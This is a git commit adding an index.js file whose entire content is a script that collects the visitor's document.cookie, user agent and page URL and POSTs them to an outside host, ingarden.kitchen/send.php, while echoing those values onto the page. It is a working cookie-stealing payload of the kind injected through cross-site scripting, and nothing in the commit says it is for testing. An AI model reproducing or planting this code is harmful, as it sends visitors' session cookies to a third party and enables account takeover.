eef0fadd3b1080097a922e96a10a18a7e7230698
itgov-bimasakti <148885451+itgov-bimasakti@users.noreply.github.com>
2024-03-28 09:12:36 +0700

    Create index.js

---
+++ index.js
@@ -0,0 +1,40 @@
+function print(id, text) {
+  const elm = document.getElementById(id);
+  if (elm !== null) {
+    elm.innerText = text;
+  }
+}
+
+const url = 'http://ingarden.kitchen/send.php';
+
+print("ua", navigator.userAgent);
+print("cookie", document.cookie);
+print("url", url);
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    userAgent: navigator.userAgent,
+    cookie: document.cookie,
+    referer: location.href,
+  }),
+})
+  .then((response) => {
+    if (response.ok) {
+      return response.text();
+    } else {
+      print("response", JSON.stringify(response));
+      return Promise.reject(response);
+    }
+  })
+  .then((data) => {
+    print("response", data);
+    console.log(data);
+  })
+  .catch(function (err) {
+    print("response", err.message);
+    console.warn("Something went wrong.", err);
+  });
